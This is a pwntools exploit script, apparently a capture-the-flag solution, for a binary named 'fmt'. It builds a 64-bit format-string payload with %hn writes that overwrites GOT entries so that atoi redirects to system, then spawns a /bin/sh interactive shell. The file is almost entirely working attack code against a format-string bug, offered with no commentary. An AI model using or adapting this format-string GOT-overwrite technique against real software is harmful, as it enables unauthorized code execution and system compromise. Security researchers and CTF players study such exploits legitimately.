from pwn import *
import subprocess
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

gdb_script = 'b* 0x4012D5'

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./fmt')
    gdb.attach(r, gdb_script)
else:
    r = remote('')

elf = ELF('./fmt')
system_got = elf.got['system']
system_plt = elf.sym['system']
atoi_got = elf.got['atoi']
main = elf.symbols['main']
libc = ELF('./libc.so.6')

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		result = 0x10000 + target - prev
		return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
	payload = ""
	for i in range(3):
		payload += p64(target_addr + i * 2)
	payload2 = ""
	for i in range(3):
		target = (target_value >> (i * 16)) & 0xffff 
		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
		prev = target
	payload = payload2.ljust(0x40 , "a") + payload
	return payload

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

ii(2)
p = fmt64(6, system_got, main)
r.send(p)

ii(2)
p = fmt64(6, atoi_got, system_plt+6)
r.send(p)

ii('/bin/sh\x00')

# log.info('libc base: 0x%x' % libc_base)
# log.info('heap base: 0x%x' % heap_base)
# log.info('pie base: 0x%x' % pie_base)

r.interactive()
